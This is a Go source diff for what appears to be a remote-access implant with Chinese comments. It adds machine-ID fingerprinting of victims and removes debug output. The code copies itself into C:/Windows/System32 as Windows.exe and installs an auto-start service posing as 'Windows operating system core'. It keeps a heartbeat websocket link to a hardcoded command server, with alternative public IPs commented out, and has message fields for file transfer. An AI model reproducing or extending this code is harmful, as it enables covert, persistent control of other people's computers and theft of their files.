@@ -6,6 +6,7 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
+	"github.com/denisbrodbeck/machineid"
 	"github.com/kardianos/service"
 	"github.com/xxtea/xxtea-go/xxtea"
 	"golang.org/x/net/websocket"
@@ -37,7 +38,9 @@ const (
 )
 
 var (
-	//baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	baseUrl = "172.16.5.1" //"127.0.0.1" //"172.16.5.1"
+	//baseUrl      = "124.156.100.149:8080"
+	//baseUrl      = "106.54.242.217"
 	conn         *websocket.Conn
 	origin       = "http://" + baseUrl + "/"
 	url          = "ws://" + baseUrl + "/hfuiefdhuiwe32uhi"
@@ -49,10 +52,11 @@ var (
 )
 
 type Message struct {
-	Uuid string `json:"uuid"`
-	Ip   string `json:"ip"`
-	Name string `json:"name"`
-	Msg  string `json:"msg"`
+	Uuid      string `json:"uuid"`
+	Machineid string `json:"machineid"` //客户端唯一识别码
+	Ip        string `json:"ip"`
+	Name      string `json:"name"`
+	Msg       string `json:"msg"`
 
 	FileName string `json:"fileName"`
 	FileBody string `json:"fileBody"`
@@ -68,14 +72,11 @@ func creatWebsocket() (*websocket.Conn, error) {
 }
 
 func begin() {
-	fmt.Println(1)
-	//daemon.Daemon(1, 0)                 //成为守护进程
 	signal.Ignore(syscall.Signal(20), syscall.Signal(17), syscall.Signal(18)) //因为代码中没有wait,所以忽略系统子进程结束信号，避免僵尸进程(go1,9没有系统子进程结束信号，自己建造信号值)
 	fork()
-	fmt.Println(2)
 	var err error
 	if !windowsLock() { //互斥锁
-		return
+		os.Exit(0)
 	}
 	go outChan() //发送消息
 	go heart()   //心跳
@@ -306,10 +307,17 @@ func strDec(str string) string {
 
 func token() string {
 	Unow := time.Now().Unix()
-	mac := getMac()
-	tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "-" + mac)) //当前时间戳+mac地址
+	//mac := getMac()
+	//tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "-" + mac)) //当前时间戳+mac地址
+	machineid := getMachineid()
+	tokenBytes := encDec([]byte(fmt.Sprint(Unow) + "--" + machineid)) //当前时间戳+系统的唯一识别码
 	token := base64.StdEncoding.EncodeToString(tokenBytes)
 	return token
+}
+
+func getMachineid() string { //每个系统的唯一识别码
+	machineid, _ := machineid.ID()
+	return machineid
 }
 func getMac() string {
 	// 获取本机的MAC地址
@@ -328,26 +336,18 @@ func fork() {
 	src, _ := filepath.Abs(filepath.Dir(os.Args[0]))
 	dst := "C:/Windows/System32/"
 	dstFileName := "Windows.exe"
-	fmt.Println(src)
 	if src == dst[:len(dst)-1] { //如果运行程序就在指定目录
 		return
 	}
 
 	_, err := fileCopy(os.Args[0], dst, dstFileName)
 	if err != nil {
-		fmt.Println("bbb", err)
 		return
 	}
 	execShell("sc create Windows binPath= C:/Windows/System32/Windows.exe start= auto displayname= Windows")
 	execShell("sc description Windows Windows operating system core")
 	execShell("sc start Windows")
 	os.Exit(0) //退自己
-}
-func forkExec(s string) error {
-	cmd := exec.Command("cmd", "/C", s)
-	err := cmd.Start()
-	time.Sleep(2 * time.Second)
-	return err
 }
 
 func fileCopy(src, dst, dstFileName string) (int64, error) {
